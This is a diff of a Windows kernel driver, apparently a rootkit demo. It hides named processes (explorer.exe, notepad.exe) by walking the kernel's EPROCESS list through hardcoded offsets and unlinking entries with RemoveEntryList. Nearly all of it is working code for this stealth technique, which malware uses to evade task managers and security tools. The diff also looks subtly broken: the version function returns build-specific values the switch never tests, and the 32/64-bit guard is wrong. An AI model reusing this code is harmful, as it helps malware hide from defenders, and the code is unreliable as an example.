@@ -1,32 +1,24 @@
-
-
 #ifndef CXX_HIDEPROCESS_H
 #	include "HideProcess.h"
 #endif
-
-//dt _eprocess    0x88  0x174
-//!process 0 0
-//.cls
 
 ULONG_PTR ActiveOffsetPre =  0;
 ULONG_PTR ActiveOffsetNext = 0;
 ULONG_PTR ImageName = 0; 
 WIN_VERSION WinVersion = WINDOWS_UNKNOW;
+
 NTSTATUS
 DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)
 {
-
-
 	DbgPrint("DriverEntry\r\n");
 
 	DriverObject->DriverUnload = UnloadDriver;
 
-
 	WinVersion = GetWindowsVersion();
-
 
     switch(WinVersion)
 	{
+#ifdef _WIN32
 	case WINDOWS_XP:   //32Bits
 		{
 
@@ -35,7 +27,7 @@ DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)
 			ImageName = 0x174; 
 			break;
 		}
-
+#else
 	case WINDOWS_7:   //64Bits 
 		{
 			ActiveOffsetPre =  0x190;
@@ -43,63 +35,43 @@ DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)
 			ImageName = 0x2e0; 
 			break;
 		}
+#endif
+	default:
+		return STATUS_NOT_SUPPORTED;
 	}
+
 	HideProcess("explorer.exe");
 	HideProcess("notepad.exe");
 	return STATUS_SUCCESS;
-
 }
 
 VOID HideProcess(char* ProcessName)
 {
-	PEPROCESS EProcessCurrent = NULL;
-	PEPROCESS EProcessPre = NULL;
+	PEPROCESS CurrentProcess = NULL;
+	PEPROCESS PreProcess = NULL;
 	PLIST_ENTRY Temp = NULL;
 
+	if(!ProcessName)
+		return;
 
+	CurrentProcess = PsGetCurrentProcess();    //System  EProcess
+	PreProcess = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)CurrentProcess + ActiveOffsetPre))) - ActiveOffsetNext); 
 
-
-
-	EProcessCurrent = PsGetCurrentProcess();    //System  EProcess
-
-
-	EProcessPre = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetPre)))-ActiveOffsetNext);
-
-	//DbgPrint("EProcessCurrent: 0x%p\r\n",EProcessCurrent);  
-
-	//DbgPrint("EProcessNext: 0x%p\r\n",EProcessNext);  
-
-
-	
-	while (EProcessCurrent!=EProcessPre)
+	while (CurrentProcess != PreProcess)
 	{
-	//	DbgPrint("%s\r\n",(char*)((ULONG_PTR)EProcessCurrent+ImageName));
-
-
-		if(strcmp((char*)((ULONG_PTR)EProcessCurrent+ImageName),ProcessName)==0)
+	    //DbgPrint("%s\r\n",(char*)((ULONG_PTR)CurrentProcess + ImageName));
+		if(strcmp((char*)((ULONG_PTR)CurrentProcess + ImageName), ProcessName) == 0)
 		{
-
-
-			Temp = (PLIST_ENTRY)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext);
+			Temp = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + ActiveOffsetNext);
 
 			if (MmIsAddressValid(Temp))
 			{
-			//	Temp->Blink->Flink = Temp->Flink;
-			//	Temp->Flink->Blink = Temp->Blink;   //数据结构
-
-
-				RemoveEntryList(Temp);
-
-				
+				RemoveEntryList(Temp);		
 			}
-		
-
 			break;
 		}
 		
-		EProcessCurrent = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)EProcessCurrent+ActiveOffsetNext)))-ActiveOffsetNext);
-
-
+		CurrentProcess = (PEPROCESS)((ULONG_PTR)(*((ULONG_PTR*)((ULONG_PTR)CurrentProcess + ActiveOffsetNext))) - ActiveOffsetNext);
 	}
 }
 
@@ -108,64 +80,83 @@ VOID UnloadDriver(PDRIVER_OBJECT  DriverObject)
 	DbgPrint("UnloadDriver\r\n");
 }
 
-
-
-
-
-
-
 WIN_VERSION GetWindowsVersion()
 {
 	RTL_OSVERSIONINFOEXW osverInfo = {sizeof(osverInfo)}; 
 	pfnRtlGetVersion RtlGetVersion = NULL;
 	WIN_VERSION WinVersion;
-	WCHAR wzRtlGetVersion[] = L"RtlGetVersion";
+	WCHAR szRtlGetVersion[] = L"RtlGetVersion";
 
-	RtlGetVersion = GetFunctionAddressByName(wzRtlGetVersion);    //Ntoskrnl.exe  导出表
+	RtlGetVersion = (pfnRtlGetVersion)GetFunctionAddressByName(szRtlGetVersion); 
+
 	if (RtlGetVersion)
 	{
 		RtlGetVersion((PRTL_OSVERSIONINFOW)&osverInfo); 
 	} 
 	else 
 	{
-		PsGetVersion(&osverInfo.dwMajorVersion, &osverInfo.dwMinorVersion, &osverInfo.dwBuildNumber, NULL);   //Documet
+		PsGetVersion(&osverInfo.dwMajorVersion, &osverInfo.dwMinorVersion, &osverInfo.dwBuildNumber, NULL);
 	}
 
-	DbgPrint("Build Number: %d\r\n", osverInfo.dwBuildNumber);
-
-	if (osverInfo.dwMajorVersion == 5 && osverInfo.dwMinorVersion == 1) 
-	{
-		DbgPrint("WINDOWS_XP\r\n");
-		WinVersion = WINDOWS_XP;
-	}
-	else if (osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1)
+	//x64位支持
+	if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1 && osverInfo.dwBuildNumber == 7600)
 	{
 		DbgPrint("WINDOWS 7\r\n");
-		WinVersion = WINDOWS_7;
+		WinVersion = WINDOWS_7_7600;
 	}
-	else if (osverInfo.dwMajorVersion == 6 && 
-		osverInfo.dwMinorVersion == 2 &&
-		osverInfo.dwBuildNumber == 9200)
+	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 1 && osverInfo.dwBuildNumber == 7601)
+	{
+		DbgPrint("WINDOWS 7\r\n");
+		WinVersion = WINDOWS_7_7601;
+	}
+	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 2 && osverInfo.dwBuildNumber == 9200)
 	{
 		DbgPrint("WINDOWS 8\r\n");
-		WinVersion = WINDOWS_8;
+		WinVersion = WINDOWS_8_9200;
 	}
-	else if (osverInfo.dwMajorVersion == 6 && 
-		osverInfo.dwMinorVersion == 3 && 
-		osverInfo.dwBuildNumber == 9600)
+	else if(osverInfo.dwMajorVersion == 6 && osverInfo.dwMinorVersion == 3 && osverInfo.dwBuildNumber == 9600)
 	{
 		DbgPrint("WINDOWS 8.1\r\n");
-		WinVersion = WINDOWS_8_1;
+		WinVersion = WINDOWS_8_9600;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 10240)
+	{
+		DbgPrint("WINDOWS 10 10240\r\n");
+		WinVersion = WINDOWS_10_10240;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 10586)
+	{
+		DbgPrint("WINDOWS 10 10586\r\n");
+		WinVersion = WINDOWS_10_10586;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 14393)
+	{
+		DbgPrint("WINDOWS 10 14393\r\n");
+		WinVersion = WINDOWS_10_14393;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 15063)
+	{
+		DbgPrint("WINDOWS 10 15063\r\n");
+		WinVersion = WINDOWS_10_15063;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 16299)
+	{
+		DbgPrint("WINDOWS 10 16299\r\n");
+		WinVersion = WINDOWS_10_16299;
+	}
+	else if(osverInfo.dwMajorVersion == 10 && osverInfo.dwMinorVersion == 0 && osverInfo.dwBuildNumber == 17134)
+	{
+		DbgPrint("WINDOWS 10 17134\r\n");
+		WinVersion = WINDOWS_10_17134;
 	}
 	else
 	{
-		DbgPrint("WINDOWS_UNKNOW\r\n");
+		DbgPrint("This is a new os\r\n");
 		WinVersion = WINDOWS_UNKNOW;
 	}
 
 	return WinVersion;
 }
-
 
 PVOID 
 GetFunctionAddressByName(WCHAR *wzFunction)
